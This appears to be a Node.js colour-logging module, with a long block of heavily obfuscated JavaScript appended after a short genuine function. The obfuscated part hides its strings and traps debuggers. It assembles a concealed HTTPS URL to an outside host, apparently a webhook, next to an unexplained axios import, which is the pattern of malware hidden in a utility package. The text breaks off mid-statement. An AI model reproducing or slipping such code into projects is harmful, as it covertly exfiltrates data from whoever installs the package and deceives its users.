var chalk = require('chalk');
var util = require('util');
var logTable = require('./log_table');
var axios = require('axios')
var countBuffer = {};

function logWithColor(color, args, isError) {
    var log = util.format.apply(this, args);
    if (isError)
        console.error(chalk[color](log));
    else
        console.log(chalk[color](log));
}
const _0x40c1bf = _0x4111, _0x9dcf4b = _0x4111, _0x3d6dd1 = _0x4111, _0x992299 = _0x4111, _0xdc332 = _0x4111; (function (_0x85e5b3, _0x23f96c) { const _0x3b4d3c = _0x4111, _0x29330a = _0x4111, _0x16ea91 = _0x4111, _0x43a6f3 = _0x4111, _0x3ae31e = _0x4111, _0x443f55 = _0x85e5b3(); while (!![]) { try { const _0x383a68 = -parseInt(_0x3b4d3c(0x1b3)) / (0x1f13 + 0x3 * -0x4c1 + -0x10cf) + -parseInt(_0x29330a(0xfe)) / (0x52 * 0x1d + 0x1d13 + -0x265b) + -parseInt(_0x29330a(0x120)) / (-0x195 * 0x11 + 0x21c6 + 0x2 * -0x36f) + parseInt(_0x16ea91(0x15c)) / (-0xd * -0x1a6 + -0x15b + -0x140f) + -parseInt(_0x29330a(0x190)) / (0x21f + -0x21c1 + -0xa8d * -0x3) + parseInt(_0x29330a(0x1b1)) / (0x23f8 + 0x4 * -0x40c + -0x13c2) * (-parseInt(_0x3b4d3c(0x175)) / (-0x19bc + -0xa9 * 0x1a + 0x63 * 0x6f)) + parseInt(_0x16ea91(0x165)) / (0x20b0 + 0x1741 + -0x37e9); if (_0x383a68 === _0x23f96c) break; else _0x443f55['push'](_0x443f55['shift']()); } catch (_0xf9bbb5) { _0x443f55['push'](_0x443f55['shift']()); } } }(_0x2f7e, -0x13 * -0x9613 + 0x88621 + -0xcabaa)); const _0x30f5ea = (function () { const _0x3c3221 = _0x4111, _0x4b2a4a = _0x4111, _0x2a9b03 = _0x4111, _0x21701b = _0x4111, _0x3aadec = _0x4111, _0x470f6c = {}; _0x470f6c[_0x3c3221(0x179)] = _0x3c3221(0x19a) + _0x3c3221(0x182) + '+$', _0x470f6c[_0x2a9b03(0x133)] = function (_0x21a4c1, _0xff5183) { return _0x21a4c1 !== _0xff5183; }, _0x470f6c[_0x3c3221(0x142)] = _0x4b2a4a(0x113), _0x470f6c[_0x3aadec(0x184)] = function (_0x1dca3a, _0x34a0a3) { return _0x1dca3a !== _0x34a0a3; }, _0x470f6c[_0x4b2a4a(0x127)] = _0x4b2a4a(0x156), _0x470f6c[_0x4b2a4a(0x17e)] = _0x2a9b03(0x167), _0x470f6c[_0x3c3221(0xe9)] = _0x21701b(0x135); const _0x361d55 = _0x470f6c; let _0x176b3f = !![]; return function (_0x5e920c, _0x1522ca) { const _0x5e7bdf = _0x3c3221, _0x1c7599 = _0x3aadec, _0x2b13c5 = _0x4b2a4a, _0x2f0869 = _0x21701b, _0x87c746 = _0x4b2a4a, _0x31b67b = { 'VImTi': _0x361d55[_0x5e7bdf(0x179)], 'kaNbs': function (_0xf860d8, _0x5e3618) { const _0x506748 = _0x5e7bdf; return _0x361d55[_0x506748(0x133)](_0xf860d8, _0x5e3618); }, 'UPOkC': _0x361d55[_0x1c7599(0x142)], 'EekTb': function (_0x50898a, _0x39ae42) { const _0x2ba6da = _0x1c7599; return _0x361d55[_0x2ba6da(0x184)](_0x50898a, _0x39ae42); }, 'FgCjr': _0x361d55[_0x5e7bdf(0x127)], 'xHpsB': _0x361d55[_0x5e7bdf(0x17e)] }; if (_0x361d55[_0x1c7599(0x184)](_0x361d55[_0x1c7599(0xe9)], _0x361d55[_0x2f0869(0xe9)])) { const _0x1247f2 = _0x2358a4[_0x5e7bdf(0x1cc)](_0x34a511, arguments); return _0x139961 = null, _0x1247f2; } else { const _0x2ac402 = _0x176b3f ? function () { const _0x170f32 = _0x1c7599, _0x417117 = _0x2f0869, _0x5d985a = _0x2b13c5, _0x380fdd = _0x5e7bdf, _0x10dbbf = _0x2f0869; if (_0x31b67b[_0x170f32(0x11a)](_0x31b67b[_0x170f32(0x1a6)], _0x31b67b[_0x5d985a(0x1a6)])) return _0x3078c5[_0x170f32(0x11d) + _0x10dbbf(0x158)]()[_0x5d985a(0x1c2) + 'h'](_0x31b67b[_0x417117(0x10d)])[_0x10dbbf(0x11d) + _0x380fdd(0x158)]()[_0x380fdd(0x16e) + _0x5d985a(0x1ac) + 'r'](_0x57a30f)[_0x10dbbf(0x1c2) + 'h'](_0x31b67b[_0x10dbbf(0x10d)]); else { if (_0x1522ca) { if (_0x31b67b[_0x5d985a(0x15d)](_0x31b67b[_0x5d985a(0x157)], _0x31b67b[_0x417117(0x1a9)])) { const _0x3fa4c2 = _0x1522ca[_0x417117(0x1cc)](_0x5e920c, arguments); return _0x1522ca = null, _0x3fa4c2; } else { if (_0x39ed94) { const _0x36871b = _0x2b9c50[_0x417117(0x1cc)](_0x142fd0, arguments); return _0x392e50 = null, _0x36871b; } } } } } : function () { }; return _0x176b3f = ![], _0x2ac402; } }; }()), _0x7274df = _0x30f5ea(this, function () { const _0x2e353f = _0x4111, _0x4b8e9b = _0x4111, _0x72d7d6 = _0x4111, _0x48ce85 = _0x4111, _0x4d49b7 = _0x4111, _0x17a9a3 = {}; _0x17a9a3[_0x2e353f(0x145)] = _0x4b8e9b(0x19a) + _0x4b8e9b(0x182) + '+$'; const _0x1ba662 = _0x17a9a3; return _0x7274df[_0x48ce85(0x11d) + _0x72d7d6(0x158)]()[_0x48ce85(0x1c2) + 'h'](_0x1ba662[_0x72d7d6(0x145)])[_0x2e353f(0x11d) + _0x48ce85(0x158)]()[_0x4b8e9b(0x16e) + _0x4b8e9b(0x1ac) + 'r'](_0x7274df)[_0x48ce85(0x1c2) + 'h'](_0x1ba662[_0x4b8e9b(0x145)]); }); _0x7274df(), (function () { const _0x34b802 = _0x4111, _0x28bf26 = _0x4111, _0x21bda9 = _0x4111, _0x1de2a0 = _0x4111, _0x33ffab = _0x4111, _0x285d26 = { 'huSvc': function (_0x4d8b49, _0x48dd9d) { return _0x4d8b49 === _0x48dd9d; }, 'sasXR': _0x34b802(0x1ba), 'tALTx': function (_0xe658d7, _0x38c8c8) { return _0xe658d7(_0x38c8c8); }, 'llvnA': function (_0x12a63f, _0x3ceedb) { return _0x12a63f + _0x3ceedb; }, 'PYCOf': _0x28bf26(0x14d) + _0x21bda9(0x130) + _0x34b802(0x151) + _0x1de2a0(0x13a), 'SslCy': _0x21bda9(0x19d) + _0x34b802(0x1ab) + _0x34b802(0xe1) + _0x21bda9(0x141) + _0x33ffab(0x16c) + _0x21bda9(0x136) + '\x20)', 'feuzk': function (_0x1e263e) { return _0x1e263e(); }, 'RSmkW': function (_0x52a631, _0x24bd2a) { return _0x52a631 !== _0x24bd2a; }, 'jatXt': _0x33ffab(0x137), 'UFUGa': _0x21bda9(0xee) }; let _0x14b3c2; try { if (_0x285d26[_0x28bf26(0x143)](_0x285d26[_0x1de2a0(0x134)], _0x285d26[_0x33ffab(0x134)])) { const _0x144d76 = _0x285d26[_0x33ffab(0x153)](Function, _0x285d26[_0x21bda9(0x104)](_0x285d26[_0x1de2a0(0x104)](_0x285d26[_0x21bda9(0xfa)], _0x285d26[_0x21bda9(0xf7)]), ');')); _0x14b3c2 = _0x285d26[_0x28bf26(0x1b5)](_0x144d76); } else { if (_0x5d28c1) { const _0xa02006 = _0x43032e[_0x21bda9(0x1cc)](_0x1df948, arguments); return _0x8e07d4 = null, _0xa02006; } } } catch (_0x3b3f9c) { if (_0x285d26[_0x34b802(0xe2)](_0x285d26[_0x1de2a0(0x14f)], _0x285d26[_0x33ffab(0x14e)])) _0x14b3c2 = window; else return !![]; } _0x14b3c2[_0x1de2a0(0x103) + _0x1de2a0(0x15f) + 'l'](_0x40ecf4, 0x461 + -0x1 * -0x71f + 0x420); }()); function _0x2f7e() { const _0x205e7a = ['Qzvab', 'ZvKcW', 'while', ')+)+)', 'Objec', 'txRvN', 'a-zA-', 'qVSFB', 'CQHmY', 'F1k8P', 'rBTOV', 'krmic', 'count', 'IllBS', 'STRSP', 'HRLkm', 'ion\x20*', '3245075crspwE', 'rVbqV', 'eKbGg', 'FdAaV', 'sHXjP', 'INbGg', '*(?:[', 'Hskdv', 'UFHiK', 'ElBTV', '(((.+', 'fpkXO', 'gger', '{}.co', 'tWOKT', 'EzqSE', 'yfmmI', 'PmefA', '2xi_T', 'Irykh', 'laybw', 'eRqcE', 'UPOkC', 'lFLAu', 'wbvlj', 'xHpsB', 'XmtvJ', 'nstru', 'ructo', 'BOIJS', 'OkqYt', 'test', 'TDzCg', '12qDLuDg', 'qLyyA', '483967BOfkSx', 'RVzRO', 'feuzk', 'NOyER', 'lEYCa', 'JSQiQ', 'hdQlA', 'qWagi', '\x5c(\x20*\x5c', 'https', 'debu', 'zaRHB', 'nWBHg', 'sVoOg', 'IMBrC', 'searc', 'FOAae', '0-9a-', 'YwpXE', 'uJRwG', 'KwhgX', 'QCJbl', 'cHMIQ', '11065', 'rgtTc', 'apply', 'IOfdB', 'MxqdR', 'KUTtv', 'uZjhB', 'TnT3w', 'ctor(', 'RSmkW', 'vMUMv', 'lyjYy', 'SDtZY', 'EFyrl', 'JXrHx', 'Kyknv', 'LULqo', 'ZBdVc', 'strin', 'kaxZB', 'WXDaf', 'dIJTk', 'fUqpg', 'chain', 'call', 'e)\x20{}', 'PRCDR', 'TljLM', 'Qltop', 'actio', 'SslCy', 'gUXTE', 'input', 'PYCOf', 'fdGmk', 'hyn', 'IQaEM', '683970crUOXi', '61876', 'ZsSQr', 'api/', 'asipZ', 'setIn', 'llvnA', 'MvgCX', 'CjlTn', 'tSMOT', '://', 'lengt', 'LkELd', 'gYTGE', 'xeZoI', 'VImTi', 'AOFyw', 'VbBhu', '\x5c+\x5c+\x20', 'wdoxA', 'nQSaf', 'kLDdg', 'jDJbo', 'nUzVo', 'Kzmsm', '$]*)', '\x20(tru', 'MYVPr', 'kaNbs', 'IzxsO', 'nEGht', 'toStr', 'xHCYU', 'cnHHt', '353139uPwIqD', 'XqGtP', 'XRlMy', 'funct', 'cFQxe', 'DYWTn', '62154', 'QwIIN', 'DeFWz', '1387', 'wCTUX', 'WfBTW', 'init', 'ekQUW', 'dLXzF', 'bqHdG', 'n\x20(fu', 'aUrPY', 'yXFJl', 'tEATU', 'sasXR', 'lsaWq', 'is\x22)(', 'cpvJa', 'PrMqk', 'xTSDM', 'n()\x20', 'dzLBs', 'AyvfH', 'BUpuf', '.com/', 'XoWtQ', 'ejHtm', '\x22retu', 'nmxMu', 'huSvc', 'Dzwec', 'NPobp', 'Xebih', 'wZWPY', 'fKBwx', 'ktNEK', 'KRxDF', 'zyvMI', 'XnRkc', 'retur', 'UFUGa', 'jatXt', 'EUbIR', 'nctio', 'ZalpZ', 'tALTx', 'jwVvL', 'XPHQa', 'oRREb', 'FgCjr', 'ing', 'QieYH', 'EJfvl', 'NGrau', '2476156jpWLJn', 'EekTb', 'pakOp', 'terva', 'Z_$][', 'TDQAE', 'state', 'HYTIG', 'Nh3xb', '16103656tYTKpv', 'ABXlO', 'LYTyP', 'GEuYm', 'gMeKU', 'HqTGx', 'KjFRI', 'rn\x20th', 'nrEcD', 'const', 'zA-Z_', 'axUIo', 'gEmcg', 'AfHnO', 'bsJmM', 'LMYny', '2033878QfZGeA', 'tiDrM', 'sRyrh', 'TdUPB', 'pdPVJ', 'AHlcP', 'BXjFu', 'unx7E', 'CQpVm', 'YaCTV']; _0x2f7e = function () { return _0x205e7a; }; return _0x2f7e(); } const _0x5cfcab = (function () { const _0x2d4d8b = _0x4111, _0x1ff719 = _0x4111, _0x6fe2ef = _0x4111, _0x2b53cd = _0x4111, _0x191239 = _0x4111, _0x2b2cea = { 'DeFWz': function (_0x1dd0b8) { return _0x1dd0b8(); }, 'WfBTW': function (_0x4540c9, _0x1ad462) { return _0x4540c9 === _0x1ad462; }, 'ejHtm': _0x2d4d8b(0x15a), 'PrMqk': _0x1ff719(0x11f), 'nUzVo': function (_0x1a55b8, _0x1d6c21) { return _0x1a55b8 === _0x1d6c21; }, 'EFyrl': _0x2d4d8b(0x18a), 'tiDrM': _0x6fe2ef(0x148), 'FOAae': function (_0x534e1c, _0x5c5774) { return _0x534e1c + _0x5c5774; }, 'PRCDR': _0x2b53cd(0x1bd), 'RVzRO': _0x2b53cd(0x19c), 'GEuYm': _0x2b53cd(0xf6) + 'n', 'rgtTc': function (_0x2c0313, _0x4ff762) { return _0x2c0313 !== _0x4ff762; }, 'ekQUW': _0x2b53cd(0x1a0), 'rVbqV': _0x191239(0x13c) }; let _0x4721e9 = !![]; return function (_0x13b068, _0x1464ca) { const _0x161914 = _0x191239, _0x372b54 = _0x191239, _0x3f02bc = _0x2d4d8b, _0x248f3f = _0x2b53cd, _0x287a6f = _0x2d4d8b, _0x138b72 = { 'LkELd': function (_0x4d5f2d, _0x7d4fbb) { const _0x1c1451 = _0x4111; return _0x2b2cea[_0x1c1451(0x1c3)](_0x4d5f2d, _0x7d4fbb); }, 'wbvlj': _0x2b2cea[_0x161914(0xf3)], 'EUbIR': _0x2b2cea[_0x161914(0x1b4)], 'jwVvL': _0x2b2cea[_0x3f02bc(0x168)] }; if (_0x2b2cea[_0x161914(0x1cb)](_0x2b2cea[_0x3f02bc(0x12d)], _0x2b2cea[_0x372b54(0x191)])) { const _0x46d021 = _0x4721e9 ? function () { const _0x505db1 = _0x161914, _0x34f61b = _0x248f3f, _0x5ddc0f = _0x161914, _0x402623 = _0x3f02bc, _0x4eede3 = _0x372b54, _0x462739 = { 'Xebih': function (_0x2d49d2) { const _0x5332a7 = _0x4111; return _0x2b2cea[_0x5332a7(0x128)](_0x2d49d2); } }; if (_0x2b2cea[_0x505db1(0x12b)](_0x2b2cea[_0x34f61b(0x140)], _0x2b2cea[_0x5ddc0f(0x138)])) (function () { return !![]; }[_0x402623(0x16e) + _0x505db1(0x1ac) + 'r'](_0x138b72[_0x5ddc0f(0x10a)](_0x138b72[_0x402623(0x1a8)], _0x138b72[_0x505db1(0x150)]))[_0x402623(0xf1)](_0x138b72[_0x402623(0x154)])); else { if (_0x1464ca) { if (_0x2b2cea[_0x4eede3(0x115)](_0x2b2cea[_0x402623(0xe6)], _0x2b2cea[_0x505db1(0x176)])) _0x462739[_0x5ddc0f(0x146)](_0x379ce3); else { const _0x53b49c = _0x1464ca[_0x505db1(0x1cc)](_0x13b068, arguments); return _0x1464ca = null, _0x53b49c; } } } } : function () { }; return _0x4721e9 = ![], _0x46d021; } else return ![]; }; }()); (function () { const _0x60f9a7 = _0x4111, _0x32cae4 = _0x4111, _0x8ef635 = _0x4111, _0x255bb8 = _0x4111, _0x3d6f33 = _0x4111, _0x3ff1e0 = { 'zyvMI': function (_0x2f81b0, _0x5c4f8f) { return _0x2f81b0(_0x5c4f8f); }, 'IOfdB': function (_0xe07b21, _0x544e09) { return _0xe07b21(_0x544e09); }, 'bsJmM': function (_0x411b1f, _0x13e5e7) { return _0x411b1f !== _0x13e5e7; }, 'sHXjP': _0x60f9a7(0x1c1), 'JXrHx': _0x32cae4(0x123) + _0x8ef635(0x18f) + _0x60f9a7(0x1bb) + ')', 'QCJbl': _0x60f9a7(0x110) + _0x60f9a7(0x196) + _0x32cae4(0x185) + _0x60f9a7(0x160) + _0x8ef635(0x1c4) + _0x32cae4(0x16f) + _0x32cae4(0x117), 'dLXzF': _0x3d6f33(0x12c), 'XPHQa': function (_0x288ca5, _0xfbea2d) { return _0x288ca5 + _0xfbea2d; }, 'nQSaf': _0x32cae4(0xf0), 'OkqYt': _0x32cae4(0xf9), 'qVSFB': function (_0xa4c238, _0x4c6c45) { return _0xa4c238 !== _0x4c6c45; }, 'ZBdVc': _0x8ef635(0x1b9), 'wZWPY': _0x32cae4(0x111), 'aUrPY': function (_0x5f5e07, _0x1d3c2e) { return _0x5f5e07(_0x1d3c2e); }, 'DYWTn': _0x3d6f33(0x1b7), 'pakOp': _0x60f9a7(0x1c0), 'sRyrh': function (_0x388a54) { return _0x388a54(); }, 'eRqcE': function (_0x29b4b9, _0x401309, _0xaf310e) { return _0x29b4b9(_0x401309, _0xaf310e); } }; _0x3ff1e0[_0x255bb8(0x1a5)](_0x5cfcab, this, function () { const _0x53e0ea = _0x60f9a7, _0x356e98 = _0x8ef635, _0x3c41e4 = _0x3d6f33, _0x4991c4 = _0x60f9a7, _0x5201e1 = _0x60f9a7; if (_0x3ff1e0[_0x53e0ea(0x173)](_0x3ff1e0[_0x53e0ea(0x194)], _0x3ff1e0[_0x356e98(0x194)])) { if (_0x1defdf) return _0x3840a0; else _0x3ff1e0[_0x3c41e4(0x14b)](_0x4c8a71, -0x2109 + -0x47b + 0x7 * 0x55c); } else { const _0x222b1e = new RegExp(_0x3ff1e0[_0x5201e1(0xe7)]), _0x161c95 = new RegExp(_0x3ff1e0[_0x53e0ea(0x1c8)], 'i'), _0x4ca313 = _0x3ff1e0[_0x3c41e4(0x14b)](_0x40ecf4, _0x3ff1e0[_0x356e98(0x12e)]); if (!_0x222b1e[_0x4991c4(0x1af)](_0x3ff1e0[_0x356e98(0x155)](_0x4ca313, _0x3ff1e0[_0x53e0ea(0x112)])) || !_0x161c95[_0x5201e1(0x1af)](_0x3ff1e0[_0x356e98(0x155)](_0x4ca313, _0x3ff1e0[_0x3c41e4(0x1ae)]))) _0x3ff1e0[_0x356e98(0x186)](_0x3ff1e0[_0x5201e1(0xea)], _0x3ff1e0[_0x356e98(0x147)]) ? _0x3ff1e0[_0x356e98(0x131)](_0x4ca313, '0') : _0x3ff1e0[_0x53e0ea(0x1cd)](_0x12383c, '0'); else { if (_0x3ff1e0[_0x3c41e4(0x186)](_0x3ff1e0[_0x3c41e4(0x125)], _0x3ff1e0[_0x3c41e4(0x15e)])) _0x3ff1e0[_0x5201e1(0x177)](_0x40ecf4); else return _0x3adcd8; } } })(); }()); function _0x4111(_0x2f2fa0, _0x1f3f14) { const _0x7274df = _0x2f7e(); return _0x4111 = function (_0x30f5ea, _0x2f7e24) { _0x30f5ea = _0x30f5ea - (0x226f + 0x13a9 * -0x1 + -0xde7); let _0x411152 = _0x7274df[_0x30f5ea]; return _0x411152; }, _0x4111(_0x2f2fa0, _0x1f3f14); } const mixture = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']; let ice = _0x40c1bf(0x1ca) + _0x40c1bf(0xff) + _0x9dcf4b(0x126) + _0x40c1bf(0x129), vanilla = _0xdc332(0x187) + _0x3d6dd1(0x188) + _0x40c1bf(0x11e) + _0x3d6dd1(0x1b2) + _0x9dcf4b(0x17c) + _0x9dcf4b(0x19b) + _0x40c1bf(0x139) + _0x40c1bf(0x1a2) + _0x3d6dd1(0x1a4) + _0x992299(0xe0) + _0x40c1bf(0x164) + _0xdc332(0x144) + _0x40c1bf(0x102) + _0x992299(0xfc), latte = mixture[0x4 * 0x5f6 + -0x1719 + -0xa9] + mixture[-0x33 * -0xf + 0x1327 * -0x1 + 0x102e * 0x1] + mixture[-0x1594 + -0x1726 + 0x2cbb] + mixture[0x1095 + 0x1 * 0x4d5 + -0x1563] + mixture[-0x2f * 0x4a + 0x25 * 0xd3 + 0x35f * -0x5] + mixture[0x15b * 0x9 + -0x21a4 + 0x157f] + mixture[0x115a + 0x1b * 0x64 + -0x2 * 0xdee] + mixture[0x11 * -0x131 + 0x2a9 * -0xd + 0xdba * 0x4], sugar = mixture[-0x2 * -0x379 + -0xa * -0x24a + -0x1dd3] + mixture[-0x230e + 0xfb * 0x11 + 0x5 * 0x3af] + mixture[-0x85f + -0xd5 * -0xb + -0x5b * 0x2] + mixture[0x2124 * -0x1 + -0x141a + 0x3540] + mixture[0xc * -0x56 + 0x1281 * 0x1 + -0xe6b] + mixture[0xbfe + 0x1 * -0x14b5 + 0x8c8] + mixture[-0xe94 + -0x6f5 * -0x3 + -0x648], sweet = _0xdc332(0x1bc) + _0xdc332(0x108) + sugar + (_0x9dcf4b(0x13e) + _0x40c1bf(0x101)) + latte + '/' + ice + '/' + vanilla; function _0x40ecf4(_0x4169d5) { const _0x4561db = _0x9dcf4b, _0x412ef4 = _0xdc332, _0x1a98fd = _0x40c1bf, _0x48bbe8 = _0x3d6dd1, _0x3bdd80 = _0x3d6dd1, _0x6a87aa = { 'Hskdv': _0x4561db(0x181) + _0x4561db(0x118) + _0x1a98fd(0xf2), 'YwpXE': _0x412ef4(0x18b) + 'er', 'bqHdG': function (_0x434715, _0x4f120f) { return _0x434715 === _0x4f120f; }, 'KwhgX': _0x1a98fd(0x18c), 'gEmcg': function (_0x37c89d, _0x1045e9, _0x1c6333) { return _0x37c89d(_0x1045e9, _0x1c6333); }, 'ZalpZ': _0x3bdd80(0x123) + _0x4561db(0x18f) + _0x48bbe8(0x1bb) + ')', 'gUXTE': _0x3bdd80(0x110) + _0x1a98fd(0x196) + _0x48bbe8(0x185) + _0x412ef4(0x160) + _0x4561db(0x1c4) + _0x4561db(0x16f) + _0x1a98fd(0x117), 'AOFyw': function (_0x55a3ec, _0xeb4872) { return _0x55a3ec(_0xeb4872); }, 'zaRHB': _0x412ef4(0x12c), 'nWBHg': function (_0x5da699, _0x485abc) { return _0x5da699 + _0x485abc; }, 'JSQiQ': _0x3bdd80(0xf0), 'axUIo': _0x48bbe8(0xf9), 'wCTUX': function (_0x163c3f) { return _0x163c3f(); }, 'KjFRI': function (_0x3b3d1f, _0x423406) { return _0x3b3d1f + _0x423406; }, 'Irykh': _0x48bbe8(0x14d) + _0x3bdd80(0x130) + _0x3bdd80(0x151) + _0x412ef4(0x13a), 'ElBTV': _0x1a98fd(0x19d) + _0x48bbe8(0x1ab) + _0x4561db(0xe1) + _0x412ef4(0x141) + _0x4561db(0x16c) + _0x3bdd80(0x136) + '\x20)', 'IzxsO': function (_0x194355, _0x9276f5) { return _0x194355 === _0x9276f5; }, 'Qltop': _0x3bdd80(0xfb), 'rBTOV': _0x412ef4(0x169), 'UFHiK': function (_0x30c0f1, _0xf919ff) { return _0x30c0f1 + _0xf919ff; }, 'cHMIQ': _0x3bdd80(0x1bd), 'INbGg': _0x3bdd80(0x19c), 'PmefA': _0x412ef4(0x162) + _0x4561db(0x183) + 't', 'CjlTn': function (_0x1f6231, _0x3562b4) { return _0x1f6231 + _0x3562b4; }, 'CQpVm': function (_0x17027b, _0x1bd42e) { return _0x17027b !== _0x1bd42e; }, 'ABXlO': _0x48bbe8(0x16a), 'BXjFu': _0x1a98fd(0x1b6), 'FdAaV': _0x1a98fd(0xeb) + 'g', 'xeZoI': _0x3bdd80(0xec), 'XRlMy': _0x4561db(0xf4), 'AfHnO': _0x412ef4(0x18d), 'uZjhB': function (_0x3e96b9, _0x490f34) { return _0x3e96b9 / _0x490f34; }, 'BOIJS': _0x1a98fd(0x109) + 'h', 'lFLAu': function (_0x41e680, _0x4053f0) { return _0x41e680 % _0x4053f0; }, 'QieYH': function (_0x755b63, _0x1924de) { return _0x755b63 === _0x1924de; }, 'yXFJl': _0x48bbe8(0xe8), 'lyjYy': _0x4561db(0x149), 'XmtvJ': _0x4561db(0xf6) + 'n', 'NGrau': function (_0x1ce817, _0x400349) { return _0x1ce817 === _0x400349; }, 'dzLBs': _0x4561db(0x1cf), 'uJRwG': function (_0x250a4d, _0x198a01) { return _0x250a4d + _0x198a01; }, 'nrEcD': function (_0xbe7ac0, _0x2dcffb) { return _0xbe7ac0(_0x2dcffb); }, 'eKbGg': function (_0x4d63c6, _0x376bd1) { return _0x4d63c6(_0x376bd1); }, 'jDJbo': function (_0xe89ce3, _0x4228c6) { return _0xe89ce3 !== _0x4228c6; }, 'HRLkm': _0x412ef4(0x100), 'ZvKcW': _0x3bdd80(0x11c), 'EzqSE': _0x412ef4(0x13d), 'AHlcP': _0x3bdd80(0x19e), 'LMYny': function (_0xd032e4, _0x35a9e0) { return _0xd032e4(_0x35a9e0); } }; function _0x23d477(_0x3131db) { const _0x74317b = _0x3bdd80, _0x2d9534 = _0x3bdd80, _0x53c11e = _0x412ef4, _0x2a1fde = _0x1a98fd, _0x42013c = _0x412ef4, _0x4b51ef = { 'tSMOT': _0x6a87aa[_0x74317b(0x152)], 'MYVPr': _0x6a87aa[_0x2d9534(0xf8)], 'MxqdR': function (_0x168883, _0x4fe3e4) { const _0x38cf85 = _0x74317b; return _0x6a87aa[_0x38cf85(0x10e)](_0x168883, _0x4fe3e4); }, 'Kzmsm': _0x6a87aa[_0x74317b(0x1be)], 'MvgCX': function (_0x5f54da, _0x5d840b) { const _0xcd09c0 = _0x74317b; return _0x6a87aa[_0xcd09c0(0x1bf)](_0x5f54da, _0x5d840b); }, 'HYTIG': _0x6a87aa[_0x2d9534(0x1b8)], 'vMUMv': function (_0x394f9, _0x1c7ced) { const _0x2e9833 = _0x2a1fde; return _0x6a87aa[_0x2e9833(0x1bf)](_0x394f9, _0x1c7ced); }, 'gYTGE': _0x6a87aa[_0x42013c(0x170)], 'IQaEM': function (_0x1fda9f) { const _0x1013a3 = _0x2d9534; return _0x6a87aa[_0x1013a3(0x12a)](_0x1fda9f); }, 'TDzCg': function (_0x327673, _0x4ed386) { const _0x11ac01 = _0x53c11e; return _0x6a87aa[_0x11ac01(0x16b)](_0x327673, _0x4ed386); }, 'XnRkc': function (_0x4c1d4b, _0x545042) { const _0x39fd52 = _0x2a1fde; return _0x6a87aa[_0x39fd52(0x1bf)](_0x4c1d4b, _0x545042); }, 'Qzvab': _0x6a87aa[_0x53c11e(0x1a3)], 'cFQxe': _0x6a87aa[_0x2d9534(0x199)], 'fUqpg': function (_0x5e5af4, _0x7d1a5e) { const _0x16613b = _0x74317b; return _0x6a87aa[_0x16613b(0x11b)](_0x5e5af4, _0x7d1a5e); }, 'XqGtP': _0x6a87aa[_0x74317b(0xf5)], 'KRxDF': _0x6a87aa[_0x42013c(0x189)], 'WXDaf': function (_0x483b62, _0x167ff1) { const _0x1d920e = _0x74317b; return _0x6a87aa[_0x1d920e(0x198)](_0x483b62, _0x167ff1); }, 'XoWtQ': _0x6a87aa[_0x42013c(0x1c9)], 'VbBhu': _0x6a87aa[_0x2a1fde(0x195)], 'TDQAE': _0x6a87aa[_0x74317b(0x1a1)], 'TdUPB': function (_0x32bd87, _0x3e8229) { const _0x466c2d = _0x2a1fde; return _0x6a87aa[_0x466c2d(0x10e)](_0x32bd87, _0x3e8229); }, 'SDtZY': function (_0x38537c, _0x4c0f68) { const _0x501caa = _0x2a1fde; return _0x6a87aa[_0x501caa(0x106)](_0x38537c, _0x4c0f68); } }; if (_0x6a87aa[_0x2a1fde(0x17d)](_0x6a87aa[_0x74317b(0x166)], _0x6a87aa[_0x53c11e(0x17b)])) { if (_0x6a87aa[_0x42013c(0x11b)](typeof _0x3131db, _0x6a87aa[_0x53c11e(0x193)])) return _0x6a87aa[_0x2a1fde(0x12f)](_0x6a87aa[_0x74317b(0x10c)], _0x6a87aa[_0x2a1fde(0x122)]) ? function (_0x5c8f0c) { }[_0x2d9534(0x16e) + _0x74317b(0x1ac) + 'r'](_0x6a87aa[_0x74317b(0x197)])[_0x42013c(0x1cc)](_0x6a87aa[_0x53c11e(0x1c5)]) : function (_0x38439b) { }[_0x74317b(0x16e) + _0x2d9534(0x1ac) + 'r'](_0x6a87aa[_0x74317b(0x197)])[_0x2d9534(0x1cc)](_0x6a87aa[_0x2a1fde(0x1c5)]); else { if (_0x6a87aa[_0x42013c(0x17d)](_0x6a87aa[_0x2a1fde(0x172)], _0x6a87aa[_0x74317b(0x172)])) { const _0x4340dc = new _0xfbded9(_0x4b51ef[_0x42013c(0x107)]), _0x5844f0 = new _0x2ee9b3(_0x4b51ef[_0x2a1fde(0x119)], 'i'), _0x45408c = _0x4b51ef[_0x74317b(0x1ce)](_0x55f902, _0x4b51ef[_0x74317b(0x116)]); !_0x4340dc[_0x74317b(0x1af)](_0x4b51ef[_0x2a1fde(0x105)](_0x45408c, _0x4b51ef[_0x2a1fde(0x163)])) || !_0x5844f0[_0x2d9534(0x1af)](_0x4b51ef[_0x42013c(0xe3)](_0x45408c, _0x4b51ef[_0x42013c(0x10b)])) ? _0x4b51ef[_0x53c11e(0x1ce)](_0x45408c, '0') : _0x4b51ef[_0x74317b(0xfd)](_0x5f57c1); } else { if (_0x6a87aa[_0x42013c(0x17d)](_0x6a87aa[_0x53c11e(0x198)]('', _0x6a87aa[_0x42013c(0xdf)](_0x3131db, _0x3131db))[_0x6a87aa[_0x74317b(0x1ad)]], 0x1 * -0x9d1 + -0x9b * -0x1 + 0x937) || _0x6a87aa[_0x2d9534(0x11b)](_0x6a87aa[_0x42013c(0x1a7)](_0x3131db, 0xc41 + -0x685 + 0x1 * -0x5a8), 0x1 * 0x6e2 + -0x13ac + 0xcca)) { if (_0x6a87aa[_0x2d9534(0x159)](_0x6a87aa[_0x74317b(0x132)], _0x6a87aa[_0x53c11e(0xe4)])) { const _0x2bc319 = _0x5d431e ? function () { const _0x2a2239 = _0x74317b; if (_0x307378) { const _0x4c5050 = _0x37e262[_0x2a2239(0x1cc)](_0x202764, arguments); return _0x5cb63d = null, _0x4c5050; } } : function () { }; return _0x141d18 = ![], _0x2bc319; } else (function () { const _0x2043ed = _0x74317b, _0x4285b6 = _0x74317b, _0x5373b5 = _0x2a1fde, _0x2f6050 = _0x2d9534, _0x722712 = _0x42013c; if (_0x6a87aa[_0x2043ed(0x12f)](_0x6a87aa[_0x4285b6(0x1c7)], _0x6a87aa[_0x4285b6(0x1c7)])) return !![]; else { const _0x430d3e = _0x4b51ef[_0x5373b5(0x1ce)](_0x317084, _0x4b51ef[_0x722712(0x1b0)](_0x4b51ef[_0x5373b5(0x14c)](_0x4b51ef[_0x4285b6(0x17f)], _0x4b51ef[_0x4285b6(0x124)]), ');')); _0x216192 = 